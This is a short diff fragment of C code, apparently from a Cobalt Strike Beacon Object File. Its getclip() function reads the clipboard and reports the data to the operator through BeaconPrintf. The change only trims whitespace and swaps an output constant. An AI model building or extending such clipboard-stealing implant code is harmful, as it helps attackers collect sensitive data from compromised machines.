@@ -60,10 +60,10 @@ void getclip()
 			if (Str)
 			{
 				size_t length = my_strlen(Str);
-				
+
 				if (length <= cblimit)
 				{
-					BeaconPrintf(CALLBACK_OUTPUT_UTF8, "Clipboard Data (%lu bytes):\n%s\n", length, Str);
+					BeaconPrintf(CALLBACK_OUTPUT, "Clipboard Data (%lu bytes):\n%s\n", length, Str);
 				}
 				else
 				{
